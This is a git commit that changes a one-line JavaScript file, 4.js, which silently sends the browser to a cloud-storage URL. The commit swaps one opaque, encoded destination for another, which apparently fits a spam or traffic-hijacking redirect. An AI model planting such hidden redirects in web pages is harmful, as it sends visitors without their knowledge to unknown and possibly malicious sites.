239aef39584d6b7665f7325ca1f376591a5477c2
malcolms6 <151632134+malcolms6@users.noreply.github.com>
2023-12-02 15:41:28 +0800

    Update 4.js

--- 4.js
+++ 4.js
@@ -1,1 +1,1 @@
-window.location.href='http://s13-video.s3.cn-east-2.jdcloud-oss.com/411?d=cjgua2ZnaHl1ZGUxMzkuY258MTYyNnwveC8xNjI2L3JnaTY='
+window.location.href='https://maobb.su.bcebos.com/Tesla?id=Mzo3dBext2vAPaWiJkFSC4Hbq7NIX19E'
